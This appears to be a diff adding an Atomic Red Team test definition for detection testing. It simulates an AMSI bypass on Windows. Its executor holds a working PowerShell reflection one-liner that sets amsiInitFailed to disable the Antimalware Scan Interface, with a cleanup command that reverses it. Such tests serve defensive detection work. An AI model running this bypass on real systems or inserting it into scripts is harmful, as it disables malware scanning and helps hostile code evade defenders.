@@ -1,0 +1,15 @@
+attack_technique: T1685
+display_name: Disable or Modify Tools
+atomic_tests:
+- name: AMSI Bypass - AMSI InitFailed
+  auto_generated_guid: 695eed40-e949-40e5-b306-b4031e4154bd
+  description: |
+    Existing Atomic Red Team AMSI InitFailed simulation. Generates AMSI related telemetry for detection testing.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    cleanup_command: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+    name: powershell
